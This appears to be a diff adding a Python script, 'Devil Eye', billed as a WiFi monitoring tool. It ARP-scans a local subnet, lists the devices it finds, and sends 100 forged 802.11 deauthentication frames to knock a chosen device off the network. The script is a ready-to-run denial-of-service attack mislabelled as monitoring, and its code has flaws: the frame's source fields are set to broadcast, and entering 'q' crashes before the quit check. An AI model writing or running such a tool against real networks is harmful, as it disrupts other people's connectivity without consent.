@@ -1,0 +1,61 @@
+import os
+import time
+from scapy.all import ARP, Dot11, Dot11Deauth, Ether, RadioTap, sendp, srp
+
+# Clear the terminal
+os.system('cls' if os.name == 'nt' else 'clear')
+
+# Display intro screen
+print("Welcome to Devil Eye - your WiFi monitoringtool!") 
+print("=============================================================")
+
+# Define the network to scan
+target_ip = "192.168.1.1/24"
+
+# Create ARP packet and broadcast it to get all the devices' MAC and IP addresses on the network
+arp = ARP(pdst=target_ip)
+ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+packet = ether/arp
+result = srp(packet, timeout=3, verbose=0)[0]
+
+# Create a list of devices found on the network
+devices = []
+id_num = 0
+for sent, received in result:
+    id_num += 1
+    devices.append({'id': id_num, 'ip': received.psrc, 'mac': received.hwsrc})
+
+# Print the list of devices found on the network
+print("Current Devices on the Network:")
+print("ID  " + "IP" + " "*15 + "MAC")
+for device in devices:
+    print("{:3} {:16} {}".format(device['id'], device['ip'], device['mac']))
+
+# Prompt the user to enter the ID number of the device they want to kick
+device_id = input("\nEnter the ID number of the device you want to kick (or 'q' to quit): ")
+
+# Find the device in the list of devices based on its ID number
+target_device = None
+for device in devices:
+    if device['id'] == int(device_id):
+        target_device = device
+        break
+
+# If the target device is found, create a deauthentication packet and send it to the target device's MAC address
+if target_device:
+    target_mac = target_device['mac']
+    print("\nKicking device {}...".format(device_id))
+    pkt = RadioTap()/Dot11(addr1=target_mac, addr2='ff:ff:ff:ff:ff:ff', addr3='ff:ff:ff:ff:ff:ff')/Dot11Deauth()
+    sendp(pkt, inter=0.1, count=100, iface="wlan0mon")
+    print("Device {} has been kicked!".format(device_id))
+else:
+    if device_id == 'q':
+        print("\nGoodbye!")
+    else:
+        print("\nDevice {} not found. Please try again.".format(device_id))
+
+# Add a cool animation
+time.sleep(1)
+print("\n" + "-"*40)
+print("Thanks for using Devil Eye. See you soon!")
+print("-"*40)
